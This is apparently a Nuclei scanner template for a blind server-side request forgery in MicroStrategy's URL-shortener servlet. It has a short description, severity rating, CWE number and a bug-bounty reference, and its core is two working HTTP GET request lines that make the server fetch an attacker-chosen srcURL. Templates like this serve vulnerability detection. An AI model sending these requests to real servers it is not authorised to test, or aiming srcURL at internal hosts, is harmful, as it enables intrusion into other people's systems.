# Nuclei Template: MicroStrategy tinyurl - Server-Side Request Forgery (Blind)
**Template ID:** microstrategy-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`microstrategy-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
Blind server-side (SSRF) request forgery vulnerability on MicroStrategy URL shortener.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com
GET {{BaseURL}}/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com
```

## References
- https://medium.com/@win3zz/how-i-made-31500-by-submitting-a-bug-to-facebook-d31bb046e204
